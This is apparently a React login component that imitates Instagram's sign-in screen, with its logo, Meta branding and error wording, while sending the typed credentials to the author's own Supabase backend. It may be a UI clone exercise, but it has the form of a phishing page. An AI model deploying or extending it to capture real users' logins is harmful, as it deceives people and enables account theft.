import { useState } from 'react'
import { supabase } from './lib/supabase'
import './App.css'

function App() {
  const [identifier, setIdentifier] = useState('')
  const [password, setPassword] = useState('')
  const [showPassword, setShowPassword] = useState(false)
  const [loading, setLoading] = useState(false)
  const [message, setMessage] = useState('')
  const [success, setSuccess] = useState(false)

  const canSubmit = identifier.trim() !== '' && password.length >= 6

  const handleSubmit = async (event) => {
    event.preventDefault()
    setMessage('')
    setSuccess(false)
    setLoading(true)

    try {
      const { error } = await supabase.auth.signInWithPassword({
        email: identifier.trim(),
        password,
      })
      if (error) throw error

      setSuccess(true)
      setMessage('Logged in!')
    } catch (error) {
      console.error('Login error:', error)
      setMessage(
        'Sorry, your password was incorrect. Please double-check your password.'
      )
    } finally {
      setLoading(false)
    }
  }

  return (
    <main className="page">
      <div className="screen">
        <button type="button" className="language">
          English (US) <span aria-hidden="true">⌄</span>
        </button>

        {/* Instagram glyph */}
        {/* Instagram glyph */}
        <svg
          className="logo"
          width="56"
          height="56"
          viewBox="0 0 56 56"
          fill="none"
          role="img"
          aria-label="Instagram"
        >
          <defs>
            <defs>
              <linearGradient id="ig" gradientUnits="userSpaceOnUse" x1="8" y1="52" x2="48" y2="4">
                <stop offset="0%" stop-color="#FEDA77" />
                <stop offset="10%" stop-color="#F58529" />
                <stop offset="25%" stop-color="#f30202" />
                <stop offset="50%" stop-color="#cb1064" />
                <stop offset="75%" stop-color="#8134AF" />
                <stop offset="100%" stop-color="#515BD4" />
              </linearGradient>
            </defs>

          </defs>

          {/* outer rounded square */}
          <rect
            x="5"
            y="5"
            width="46"
            height="46"
            rx="14"
            stroke="url(#ig)"
            strokeWidth="5"
          />
          {/* lens ring */}
          <circle cx="28" cy="28" r="10.5" stroke="url(#ig)" strokeWidth="5" />
          {/* flash dot */}
          <circle cx="40.5" cy="15.5" r="3" fill="url(#ig)" />
        </svg>

        <form onSubmit={handleSubmit}>
          <div className="field">
            <input
              type="text"
              placeholder="Username, email or mobile number"
              value={identifier}
              onChange={(e) => setIdentifier(e.target.value)}
              autoComplete="username"
              maxLength={100}
            />
            <svg
              className="field-icon"
              width="18"
              height="18"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              strokeWidth="1.8"
              strokeLinecap="round"
              strokeLinejoin="round"
              aria-hidden="true"
            >
              <circle cx="12" cy="8" r="4" />
              <path d="M4 21c0-4.4 3.6-8 8-8s8 3.6 8 8" />
            </svg>
          </div>

          <div className="field">
            <input
              type={showPassword ? 'text' : 'password'}
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              autoComplete="current-password"
            />
            <button
              type="button"
              className="eye-btn"
              onClick={() => setShowPassword((s) => !s)}
              aria-label={showPassword ? 'Hide password' : 'Show password'}
            >
              <svg
                width="18"
                height="18"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                strokeWidth="1.8"
                strokeLinecap="round"
                strokeLinejoin="round"
                aria-hidden="true"
              >
                <path d="M2 12s3.6-7 10-7 10 7 10 7-3.6 7-10 7S2 12 2 12z" />
                <circle cx="12" cy="12" r="3" />
                {!showPassword && <path d="M3 3l18 18" />}
              </svg>
            </button>
          </div>

          <button
            type="submit"
            className="submit-btn"
            disabled={loading || !canSubmit}
          >
            {loading ? 'Logging in...' : 'Log in'}
          </button>

          {message && (
            <p
              role="status"
              className={`form-message ${success ? 'success' : 'error'}`}
            >
              {message}
            </p>
          )}

          <a className="forgot" href="#!">Forgot password ?</a>
        </form>

        <div className="bottom">
          <button type="button" className="create-btn">
            Create new account
          </button>

          <div className="meta">
            <svg width="22" height="12" viewBox="0 0 36 18" fill="none" aria-hidden="true">
              <path
                d="M9 16c-3 0-5-3-5-7s2-7 5-7c4 0 7 14 12 14 3 0 5-3 5-7s-2-7-5-7c-5 0-8 14-12 14z"
                stroke="currentColor"
                strokeWidth="2.4"
                strokeLinecap="round"
                strokeLinejoin="round"
                transform="translate(2 0)"
              />
            </svg>
            <span>Meta</span>
          </div>
        </div>
      </div>
    </main>
  )
}

export default App